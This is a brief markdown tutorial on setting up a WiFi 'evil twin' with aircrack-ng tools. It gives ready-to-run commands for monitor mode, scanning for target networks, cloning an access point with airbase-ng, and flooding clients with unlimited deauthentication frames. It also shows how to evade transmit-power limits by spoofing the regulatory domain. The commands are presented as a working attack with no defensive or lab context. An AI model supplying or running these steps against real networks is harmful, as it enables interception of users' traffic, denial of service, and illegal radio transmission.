Basic Evil Twin Setup
=====================

**Put your WiFi card in monitoring mode**

```sh
airmon-ng start wlan0
```

This command is going to crate a new network interface called `wlan0mon`

**Start airdump-ng**

```sh
airodump-ng wlan0mon
```

Leave airdump open throughout the session to find other interesting data

**Select the SSID to twin**

The right-most column contains the SSIDs currently advertised but have a look at the second part of airdump-ng output which contains the probe requests.

Take a note of the name, the channel and the BSSID (MAC address).

**Create a new access point (the evil twin)**

```sh
airbase-ng -a <bssid> --essid <essid> -c <channel number> wlan0mon
```

You don't need the `-a` flag in some cases. Don't be afraid to experiment.

**Deauth Clients**

```sh
aireplay-ng --deauth 0 -a <bssid>
```

**Boost The Power**

```sh
iw reg set BO
```

This will reconfigure the card to use Bolivia's regulatory requirements which will allows us to max out the txpower. You can also use country code US in some cases.

```sh
iwconfig wlan0 txpower 30
```

This command will set the power up.
